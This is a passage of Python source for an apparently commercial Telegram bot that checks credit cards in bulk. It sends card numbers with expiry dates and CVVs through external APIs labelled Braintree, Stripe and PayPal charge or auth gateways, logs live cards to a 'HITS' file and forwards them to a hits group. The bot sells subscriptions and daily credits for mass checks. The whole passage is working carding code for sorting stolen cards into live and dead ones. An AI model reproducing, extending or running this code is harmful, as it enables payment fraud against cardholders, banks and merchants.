            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(B4_API_URL.format(formatted_cc), headers=headers, timeout=200)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                    
                status = data.get('status', '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱')
                message = data.get('response', 'Declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success' , '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error' '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree Premium Auth 2'
        }


# Handle both /b3 and .b3
@bot.message_handler(commands=['b4'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.b4'))
def handle_b4(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /b3 CC|MM|YYYY|CVV or .b3 CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Braintree Premium Auth 2</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_b4_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mb3 and .mb3
@bot.message_handler(commands=['mb4'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mb4'))
def handle_mb3(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_b4_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Braintree Auth'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


def check_ss_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(SS_API_URL.format(formatted_cc), headers=headers, timeout=300)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [22.7$]'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [22.7$]'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [22.7$]'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [22.7$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe [22.7$]'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe [22.7$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe [22.7$]'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe [22.7$]'
        }
    

# Handle both /b3 and .b3
@bot.message_handler(commands=['ss'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ss'))
def handle_ss(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /ss CC|MM|YYYY|CVV or .ss CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe [22.7$] </i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_ss_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - ss] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mb3 and .mb3
@bot.message_handler(commands=['mss'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mss'))
def handle_mss(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_ss_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe [22.7$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_pp_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Paypal [2$]'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(PP_API_URL.format(formatted_cc), headers=headers, timeout=300)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [2$]'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [2$]'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [2$]'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Paypal [2$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Paypal [2$]'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Paypal [2$]'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Paypal [2$]'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
